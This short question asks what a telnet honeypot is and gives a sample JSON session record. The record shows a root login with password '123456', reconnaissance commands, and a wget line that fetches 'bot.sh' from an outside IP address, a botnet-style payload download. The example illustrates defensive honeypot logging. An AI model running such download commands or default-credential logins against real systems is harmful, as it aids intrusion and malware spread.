now what is a telnet honeypot?

like below given is one example of what a session will look like 
{
  "session_id": 42,
  "client_ip": "45.83.91.122",
  "username": "root",
  "password": "123456",
  "commands": [
    "uname -a",
    "id",
    "wget http://185.234.219.10/bot.sh"
  ],
  "duration_seconds": 38,
  "bytes_in": 214,
  "bytes_out": 487
}
